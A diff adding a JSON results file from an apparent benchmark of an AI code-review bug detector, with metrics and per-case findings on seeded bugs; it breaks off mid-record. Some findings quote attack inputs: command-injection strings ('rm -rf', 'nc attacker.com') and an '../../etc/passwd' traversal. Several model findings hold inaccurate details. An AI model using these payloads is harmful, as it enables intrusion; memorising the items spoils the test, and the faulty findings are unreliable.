@@ -1,0 +1,2119 @@
+{
+  "info": {
+    "timestamp": "2026-10-18T07:51:31.559510+00:00",
+    "dataset": "evals/datasets/v1",
+    "split": "dev",
+    "provider": "groq",
+    "model": "qwen/qwen3.8-27b",
+    "prompt_version": "3aba328c84b1",
+    "repeats": 3,
+    "tolerance": 3,
+    "git_sha": "15fd11b",
+    "git_dirty": true
+  },
+  "summary": {
+    "precision": {
+      "mean": 0.8425925925925926,
+      "min": 0.75,
+      "max": 1.0
+    },
+    "recall": {
+      "mean": 0.7575757575757577,
+      "min": 0.6363636363636364,
+      "max": 0.8181818181818182
+    },
+    "f1": {
+      "mean": 0.7942028985507247,
+      "min": 0.7000000000000001,
+      "max": 0.9
+    },
+    "clean_fp_rate": {
+      "mean": 0.14814814814814814,
+      "min": 0.0,
+      "max": 0.2222222222222222
+    }
+  },
+  "repeats": [
+    {
+      "repeat": 1,
+      "metrics": {
+        "cases": 20,
+        "bug_cases": 11,
+        "clean_cases": 9,
+        "failed_cases": 1,
+        "tp": 9,
+        "fp": 0,
+        "fn": 2,
+        "precision": 1.0,
+        "recall": 0.8181818181818182,
+        "f1": 0.9,
+        "clean_fp_rate": 0.0,
+        "location_exact_rate": 1.0,
+        "category_match_rate": 0.8888888888888888
+      },
+      "cases": [
+        {
+          "case_id": "clean_docs_and_comments_only",
+          "repeat": 1,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 321,
+          "prompt_tokens": 942,
+          "completion_tokens": 17,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "clean_extract_subtotal",
+          "repeat": 1,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 188,
+          "prompt_tokens": 1047,
+          "completion_tokens": 17,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "clean_log_and_reraise",
+          "repeat": 1,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 161,
+          "prompt_tokens": 826,
+          "completion_tokens": 13,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "clean_remove_dead_code",
+          "repeat": 1,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 158,
+          "prompt_tokens": 815,
+          "completion_tokens": 12,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "clean_rename_only",
+          "repeat": 1,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 160,
+          "prompt_tokens": 891,
+          "completion_tokens": 8,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "clean_retry_with_backoff",
+          "repeat": 1,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 1240,
+          "prompt_tokens": 974,
+          "completion_tokens": 523,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "clean_threaded_fetch",
+          "repeat": 1,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 205,
+          "prompt_tokens": 1219,
+          "completion_tokens": 13,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "command_injection_ping",
+          "repeat": 1,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 7988,
+          "prompt_tokens": 812,
+          "completion_tokens": 403,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "29e419e4-9fe1-4861-8714-e8bfbb264dbe:bug_detector:1",
+              "category": "security",
+              "severity": "critical",
+              "confidence": 1.0,
+              "file_path": "app/admin/diagnostics.py",
+              "line_start": 9,
+              "line_end": 11,
+              "side": "RIGHT",
+              "title": "Command injection via shell=True with user-supplied host argument",
+              "defect": "ping_host constructs a shell command using an f-string that directly interpolates the host parameter and executes it with shell=True. This allows an attacker to inject arbitrary shell commands by supplying a crafted string as host (e.g., host='example.com; rm -rf /' or host='$(malicious_command)').",
+              "trigger": "Passing a string containing shell metacharacters (such as ;, &&, ||, backticks, or $()) to the host parameter.",
+              "impact": "Remote code execution as the process user, potentially leading to data destruction, privilege escalation, or full system compromise.",
+              "recommendation": "Use subprocess.run with a list of arguments and shell=False to prevent shell interpretation. For example: subprocess.run(['ping', '-c', '1', host], capture_output=True, timeout=5). Additionally, validate the host format to ensure it is a legitimate hostname or IP address before use.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/admin/diagnostics.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 9,
+                  "line_end": 11,
+                  "excerpt": "result = subprocess.run(\n        f\"ping -c 1 {host}\", shell=True, capture_output=True, timeout=5\n    )"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "ctx_removed_validation",
+          "repeat": 1,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 23560,
+          "prompt_tokens": 871,
+          "completion_tokens": 441,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "b98b0800-38dc-485b-af03-56041ad5c4cd:bug_detector:1",
+              "category": "bug",
+              "severity": "high",
+              "confidence": 0.8,
+              "file_path": "app/api/accounts.py",
+              "line_start": 10,
+              "line_end": 10,
+              "side": "RIGHT",
+              "title": "Removed input validation allowing non-positive withdrawal amounts",
+              "defect": "The endpoint no longer validates `amount_cents <= 0` before calling `AccountService().withdraw`. The comment claims validation is handled in `AccountService`, but without repository context to confirm that service implementation, this unguarded value may propagate to business logic.",
+              "trigger": "A client passes `amount_cents` as 0 or a negative number in the POST body for `/accounts/{account_id}/withdraw`.",
+              "impact": "Invalid withdrawal amounts reach the service layer, potentially causing incorrect balance mutations, over-withdrawal (negative amounts), or undefined behavior because the API layer no longer enforces the positive-amount contract.",
+              "recommendation": "Restore API-layer validation: `if amount_cents <= 0: raise HTTPException(status_code=422, detail=\"amount must be positive\")`, or verify that `AccountService().withdraw` reliably rejects non-positive amounts before relying on it.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/api/accounts.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 10,
+                  "line_end": 10,
+                  "excerpt": "    # Validation is handled in AccountService."
+                },
+                {
+                  "source": "diff",
+                  "file_path": "app/api/accounts.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 11,
+                  "line_end": 11,
+                  "excerpt": "    balance = AccountService().withdraw(account_id, amount_cents)"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "ctx_swapped_transfer_args",
+          "repeat": 1,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 26423,
+          "prompt_tokens": 754,
+          "completion_tokens": 353,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "06a29ea5-2a32-4233-9404-dde5bdcb9d75:bug_detector:1",
+              "category": "bug",
+              "severity": "high",
+              "confidence": 0.9,
+              "file_path": "app/billing/refunds.py",
+              "line_start": 6,
+              "line_end": 6,
+              "side": "RIGHT",
+              "title": "Refund order transfers to customer instead of merchant",
+              "defect": "The call to ledger.transfer has the destination and source accounts swapped. The docstring indicates a refund should move money from the merchant to the customer, but the code passes customer as the source and merchant as the destination.",
+              "trigger": "Any time refund_order is invoked for a valid order.",
+              "impact": "Executing a refund drains funds from the customer and deposits them into the merchant account, which is the opposite of the intended financial operation and may result in significant financial loss.",
+              "recommendation": "Swap the account arguments so the transfer is from the merchant account to the customer account: `ledger.transfer(order.merchant_account, order.customer_account, order.total_cents)`.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/billing/refunds.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 5,
+                  "line_end": 6,
+                  "excerpt": "    \"\"\"Return the order total from the merchant to the customer.\"\"\"\n    ledger.transfer(order.customer_account, order.merchant_account, order.total_cents)"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "hardcoded_api_secret",
+          "repeat": 1,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 21479,
+          "prompt_tokens": 987,
+          "completion_tokens": 323,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "d06ad611-fbf4-4bb1-89ff-1377f548ad14:bug_detector:1",
+              "category": "security",
+              "severity": "critical",
+              "confidence": 1.0,
+              "file_path": "app/billing/gateway.py",
+              "line_start": 4,
+              "line_end": 4,
+              "side": "RIGHT",
+              "title": "Hardcoded live API secret",
+              "defect": "A live API key is committed as a module-level constant in source code.",
+              "trigger": "Any access to the source code or its version history, or any environment where this code is executed.",
+              "impact": "Anyone with read access to the codebase or repository history gains full access to the payment API, allowing unauthorized charges and fund movement.",
+              "recommendation": "Remove the hardcoded secret immediately, revoke and rotate the exposed key, and load it from a secure environment variable or a dedicated secrets manager at runtime.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/billing/gateway.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 4,
+                  "line_end": 4,
+                  "excerpt": "API_KEY = \"gw_live_51Hq9XkLmN3pQ7rStUvWxYz0123456789abcdef\""
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "idor_invoice_view",
+          "repeat": 1,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 19659,
+          "prompt_tokens": 922,
+          "completion_tokens": 365,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": false
+            }
+          ],
+          "findings": [
+            {
+              "id": "d751d017-1b4a-4aa7-b1b2-304c901af2f7:bug_detector:1",
+              "category": "bug",
+              "severity": "high",
+              "confidence": 0.95,
+              "file_path": "app/api/invoices.py",
+              "line_start": 16,
+              "line_end": 19,
+              "side": "RIGHT",
+              "title": "Missing authorization check in get_invoice",
+              "defect": "The endpoint returns an invoice based only on `invoice_id` without verifying that the invoice belongs to the authenticated `user`. The `repo.get_invoice(invoice_id)` call should be restricted to the requesting user's invoices; the current code allows any authenticated user to read any invoice.",
+              "trigger": "Any authenticated user requests an invoice ID that belongs to another user.",
+              "impact": "Users can access and view other users' invoices, causing unauthorized data disclosure.",
+              "recommendation": "Use the repository method scoped to the current user (e.g., `repo.get_invoice_for_user(invoice_id, user.id)`) or verify ownership after fetching, so only the owner can retrieve the invoice.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/api/invoices.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 16,
+                  "line_end": 19,
+                  "excerpt": "    invoice = repo.get_invoice(invoice_id)\n    if invoice is None:\n        raise HTTPException(status_code=404, detail=\"Invoice not found\")\n    return invoice.to_dict()"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "inverted_bulk_discount",
+          "repeat": 1,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 21884,
+          "prompt_tokens": 963,
+          "completion_tokens": 594,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "51f57429-0d26-46be-a97b-46171e173cdb:bug_detector:1",
+              "category": "bug",
+              "severity": "high",
+              "confidence": 0.95,
+              "file_path": "app/pricing.py",
+              "line_start": 14,
+              "line_end": 14,
+              "side": "RIGHT",
+              "title": "Inverted bulk-discount comparison",
+              "defect": "The bulk-discount condition uses `<=` instead of `>=`, so the discount is applied to orders *below or at* the threshold rather than at or above it.",
+              "trigger": "Any order with `quantity > 10` that is not eligible for the member rate (or even is), e.g. `apply_discount(1000, 20, False)`.",
+              "impact": "Large orders (the ones the 5 % bulk discount is intended for) receive no discount at all, while small orders of one item or fewer incorrectly receive it. This directly contradicts the docstring and the constant name `BULK_THRESHOLD = 10`. Monetarily, revenue can leak (over-discounting small orders) and expected discounts are missed (under-discounting large orders).",
+              "recommendation": "Change the condition to `if quantity >= BULK_THRESHOLD:` and double-check the intent is non-stacking with the member rate (currently `min()` only lowers the rate, which is fine if the goal is 'the better of the two applies'). Also consider whether small quantities (e.g., 1) should really get any discount.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/pricing.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 3,
+                  "line_end": 3,
+                  "excerpt": "BULK_THRESHOLD = 10"
+                },
+                {
+                  "source": "diff",
+                  "file_path": "app/pricing.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 6,
+                  "line_end": 10,
+                  "excerpt": "    \"\"\"Members get 10% off; orders of 10 or more items get 5% off.\n\n    The better of the two applies, they do not stack.\n    \"\"\""
+                },
+                {
+                  "source": "diff",
+                  "file_path": "app/pricing.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 14,
+                  "line_end": 15,
+                  "excerpt": "    if quantity <= BULK_THRESHOLD:\n        rate = min(rate, BULK_RATE)"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "missing_await_on_save",
+          "repeat": 1,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 33084,
+          "prompt_tokens": 860,
+          "completion_tokens": 183,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "c9b41d50-70cf-4dfa-a8f0-d74a31008683:bug_detector:1",
+              "category": "bug",
+              "severity": "high",
+              "confidence": 0.99,
+              "file_path": "app/jobs.py",
+              "line_start": 13,
+              "line_end": 13,
+              "side": "RIGHT",
+              "title": "await removed from store.save",
+              "defect": "store.save was originally awaited, but the new call invokes store.save(result) without await. If store.save is a coroutine, the job completes without persisting the record.",
+              "trigger": "Any call to record_result for a result containing an id.",
+              "impact": "Review results are not saved, causing data loss and misleading logs that report the record as saved.",
+              "recommendation": "Change the call to await store.save(result) so the coroutine is executed before logging and returning.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/jobs.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 13,
+                  "line_end": 13,
+                  "excerpt": "store.save(result)"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "n_plus_one_order_report",
+          "repeat": 1,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 10367,
+          "prompt_tokens": 941,
+          "completion_tokens": 8,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 1,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "off_by_one_pagination",
+          "repeat": 1,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 5422,
+          "prompt_tokens": 1019,
+          "completion_tokens": 324,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "4a7c2fdc-04e5-48bf-bdc5-24c1ed25a4c9:bug_detector:1",
+              "category": "bug",
+              "severity": "high",
+              "confidence": 0.97,
+              "file_path": "src/pagination.py",
+              "line_start": 15,
+              "line_end": 16,
+              "side": "RIGHT",
+              "title": "Off-by-one in paginate slice calculation",
+              "defect": "The slice start is computed as page * page_size, but 1-based pages should use start = (page - 1) * page_size.",
+              "trigger": "Any call to paginate (or first_page) with page_size >= 1, including page=1.",
+              "impact": "first_page returns an empty list even when items exist, and all pages are shifted forward by one page, exposing wrong item subsets to callers.",
+              "recommendation": "Change the calculation to start = (page - 1) * page_size.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "src/pagination.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 15,
+                  "line_end": 16,
+                  "excerpt": "start = page * page_size\nend = start + page_size"
+                },
+                {
+                  "source": "diff",
+                  "file_path": "src/pagination.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 11,
+                  "line_end": 12,
+                  "excerpt": "def paginate(items: list, page: int, page_size: int) -> list:\n    \"\"\"Return one page of items. Pages are numbered from 1.\"\"\""
+                },
+                {
+                  "source": "diff",
+                  "file_path": "src/pagination.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 7,
+                  "line_end": 8,
+                  "excerpt": "def first_page(items: list, page_size: int) -> list:\n    \"\"\"Return the first page of items.\"\"\""
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "path_traversal_download",
+          "repeat": 1,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 20049,
+          "prompt_tokens": 932,
+          "completion_tokens": 390,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "323bd7fd-b8de-4a91-9bfe-d947f4823532:bug_detector:1",
+              "category": "security",
+              "severity": "critical",
+              "confidence": 0.99,
+              "file_path": "app/api/files.py",
+              "line_start": 18,
+              "line_end": 18,
+              "side": "RIGHT",
+              "title": "Path traversal vulnerability in download endpoint",
+              "defect": "The `filename` parameter is concatenated directly to `UPLOAD_DIR` without any sanitization or validation, allowing the `:path` converter to include `../` sequences. An attacker can supply a filename like `../../etc/passwd` to traverse outside the intended upload directory.",
+              "trigger": "A client sends a GET request to `/files/../../etc/passwd` (or similar path-traversal payload) hitting the download route.",
+              "impact": "An attacker can read arbitrary files from the server filesystem, leading to full confidentiality breach, potential disclosure of credentials or configuration files, and possible escalation to full system compromise.",
+              "recommendation": "Reject or normalize the path and verify the resolved path stays within `UPLOAD_DIR`. For example: `resolved = os.path.realpath(os.path.join(UPLOAD_DIR, filename)); if not resolved.startswith(os.path.realpath(UPLOAD_DIR) + os.sep): raise HTTPException(status_code=400, detail=\"Invalid path\")`. Use `resided = resolved` for the FileResponse.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/api/files.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 17,
+                  "line_end": 21,
+                  "excerpt": "def download(filename: str) -> FileResponse:\n    full_path = os.path.join(UPLOAD_DIR, filename)\n    if not os.path.exists(full_path):\n        raise HTTPException(status_code=404, detail=\"File not found\")\n    return FileResponse(full_path)"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "race_condition_lost_update",
+          "repeat": 1,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 17799,
+          "prompt_tokens": 1315,
+          "completion_tokens": 13,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 1,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "tictactoe_final_design",
+          "repeat": 1,
+          "status": "failed",
+          "failure_code": "provider_error",
+          "duration_ms": 6923,
+          "prompt_tokens": 0,
+          "completion_tokens": 0,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "tictactoe_symbol_property",
+          "repeat": 1,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 23325,
+          "prompt_tokens": 757,
+          "completion_tokens": 13,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        }
+      ]
+    },
+    {
+      "repeat": 2,
+      "metrics": {
+        "cases": 20,
+        "bug_cases": 11,
+        "clean_cases": 9,
+        "failed_cases": 1,
+        "tp": 7,
+        "fp": 2,
+        "fn": 4,
+        "precision": 0.7777777777777778,
+        "recall": 0.6363636363636364,
+        "f1": 0.7000000000000001,
+        "clean_fp_rate": 0.2222222222222222,
+        "location_exact_rate": 0.8571428571428571,
+        "category_match_rate": 1.0
+      },
+      "cases": [
+        {
+          "case_id": "clean_docs_and_comments_only",
+          "repeat": 2,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 166,
+          "prompt_tokens": 942,
+          "completion_tokens": 13,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "clean_extract_subtotal",
+          "repeat": 2,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 186,
+          "prompt_tokens": 1047,
+          "completion_tokens": 13,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "clean_log_and_reraise",
+          "repeat": 2,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 2698,
+          "prompt_tokens": 826,
+          "completion_tokens": 13,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "clean_remove_dead_code",
+          "repeat": 2,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 6736,
+          "prompt_tokens": 815,
+          "completion_tokens": 13,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "clean_rename_only",
+          "repeat": 2,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 8689,
+          "prompt_tokens": 891,
+          "completion_tokens": 429,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 1,
+          "fn": 0,
+          "matches": [],
+          "findings": [
+            {
+              "id": "97952518-bde1-4d64-b325-fabe780e7c3b:bug_detector:1",
+              "category": "bug",
+              "severity": "high",
+              "confidence": 0.95,
+              "file_path": "app/orders/totals.py",
+              "line_start": 1,
+              "line_end": 1,
+              "side": "RIGHT",
+              "title": "Function renamed without verifying external callers",
+              "defect": "The function calc_tot was renamed to calculate_total. All internal references in totals.py were updated, but if any external module imports calc_tot from this module, those imports will fail with ImportError/AttributeError.",
+              "trigger": "Any module outside app/orders/totals.py that does `from app.orders.totals import calc_tot` or `totals.calc_tot(...)`. Since repository context confirming no external callers was not provided, this rename constitutes a breaking API change.",
+              "impact": "Runtime ImportError or AttributeError in any consumer that still references the old name, potentially breaking order processing, billing, or reporting pipelines.",
+              "recommendation": "Verify that no external code references `calc_tot`. If external callers exist, either keep a backward-compatible alias (`calc_tot = calculate_total`) or update all callers before landing this change.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/orders/totals.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 1,
+                  "line_end": 1,
+                  "excerpt": "def calculate_total(items, tax_rate):"
+                },
+                {
+                  "source": "diff",
+                  "file_path": "app/orders/totals.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 7,
+                  "line_end": 7,
+                  "excerpt": "return {\"id\": order.id, \"total_cents\": calculate_total(order.items, order.tax_rate)}"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "clean_retry_with_backoff",
+          "repeat": 2,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 11814,
+          "prompt_tokens": 974,
+          "completion_tokens": 17,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "clean_threaded_fetch",
+          "repeat": 2,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 6231,
+          "prompt_tokens": 1219,
+          "completion_tokens": 13,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 0,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "command_injection_ping",
+          "repeat": 2,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 7507,
+          "prompt_tokens": 812,
+          "completion_tokens": 378,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": false,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "97275d5a-4a4f-49cb-8ef8-37288489b341:bug_detector:1",
+              "category": "security",
+              "severity": "critical",
+              "confidence": 1.0,
+              "file_path": "app/admin/diagnostics.py",
+              "line_start": 10,
+              "line_end": 10,
+              "side": "RIGHT",
+              "title": "Shell injection via unsanitized substring in subprocess",
+              "defect": "The host argument is interpolated into a shell command string and executed with shell=True. The parameter is only bound directly to ping -c 1, so it can append arbitrary shell syntax before the command is parsed by the shell.",
+              "trigger": "A caller passes a host value containing shell metacharacters or command separators such as 'example.com; rm -rf ~' or 'example.com | nc attacker.com 8080'.",
+              "impact": "An unprivileged or partially trusted caller can execute arbitrary system commands with the privileges of the application process, leading to complete host compromise.",
+              "recommendation": "Pass the command as a list and avoid the shell: subprocess.run(['ping', '-c', '1', host], capture_output=True, timeout=5). Additionally, validate host against a strict hostname or IP regex before use.",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/admin/diagnostics.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 10,
+                  "line_end": 10,
+                  "excerpt": "f\"ping -c 1 {host}\", shell=True, capture_output=True, timeout=5"
+                }
+              ]
+            }
+          ]
+        },
+        {
+          "case_id": "ctx_removed_validation",
+          "repeat": 2,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 6758,
+          "prompt_tokens": 871,
+          "completion_tokens": 17,
+          "model_calls": 1,
+          "tp": 0,
+          "fp": 0,
+          "fn": 1,
+          "matches": [],
+          "findings": []
+        },
+        {
+          "case_id": "ctx_swapped_transfer_args",
+          "repeat": 2,
+          "status": "completed",
+          "failure_code": null,
+          "duration_ms": 7504,
+          "prompt_tokens": 754,
+          "completion_tokens": 394,
+          "model_calls": 1,
+          "tp": 1,
+          "fp": 0,
+          "fn": 0,
+          "matches": [
+            {
+              "expected_index": 0,
+              "finding_index": 0,
+              "location_exact": true,
+              "category_match": true
+            }
+          ],
+          "findings": [
+            {
+              "id": "a00c7f37-9f0f-4af1-b619-6d3b217aa113:bug_detector:1",
+              "category": "bug",
+              "severity": "high",
+              "confidence": 0.95,
+              "file_path": "app/billing/refunds.py",
+              "line_start": 6,
+              "line_end": 6,
+              "side": "RIGHT",
+              "title": "Refund transfers money from customer to merchant instead of merchant to customer",
+              "defect": "refund_order sends order.total_cents from the customer account to the merchant account. The docstring states the order total should be returned from the merchant to the customer, so the transfer arguments are reversed.",
+              "trigger": "Any refund request that passes a valid order to refund_order().",
+              "impact": "Customers lose the refunded amount twice and merchants receive correct sales plus the refund. This creates financial loss and incorrect account balances.",
+              "recommendation": "Swap the account arguments to transfer from the merchant to the customer, e.g. ledger.transfer(order.merchant_account, order.customer_account, order.total_cents).",
+              "agent": "bug_detector",
+              "evidence": [
+                {
+                  "source": "diff",
+                  "file_path": "app/billing/refunds.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 6,
+                  "line_end": 6,
+                  "excerpt": "ledger.transfer(order.customer_account, order.merchant_account, order.total_cents)"
+                },
+                {
+                  "source": "diff",
+                  "file_path": "app/billing/refunds.py",
+                  "commit_sha": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                  "line_start": 5,
+                  "line_end": 5,
+                  "excerpt": "\"\"\"Return the order total from the merchant to the customer.\"\"\""
+                }
+              ]
+            }
+          ]
+        },
+        {
